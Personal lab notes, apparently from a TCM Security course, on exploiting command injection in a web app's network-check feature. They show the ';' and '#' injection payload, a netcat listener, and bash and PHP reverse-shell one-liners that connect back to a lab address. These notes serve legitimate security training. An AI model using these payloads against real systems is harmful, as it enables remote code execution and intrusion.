##  Command Injection - Basics
### Normal App Functionality
- Access first command injection lab
- Has a network check functionality
- Enter in a URL to check connection
- Enter `https://tcm-sec.com/` and it displays the curl command and the result

### Try Payloads for Different Behavior
- After trying a few different payloads, I found that it needs a `;` in the beggining and a `#` at the end
- Enter `; ls #` returns the execution of `ls` listing the contents of the directory

- Since this isn't very nice to read, view the source with ctrl+u, and it is easier to read
### Reverse Shell
- Let's try to pop a reverse shell with bash
- Set up netcat listener: `nc -lvnp 4242`
- It is good practice to user the absolute path for binaries: `/bin/bash`
- Enter `; /bin/bash -i> & /dev/tcp/10.0.2.14/4242 0>&1 #`, didn't work
- Knowing when we listed the contents of the directory and saw all the php files, we could try using php
- Enter `; /usr/local/bin/php -r '$sock=fsockopen("10.0.2.15",4242);exec("/bin/sh -i <&3 >&3 2>&3");' #` and the browser hangs
- Checking the listener, we caught a shell!
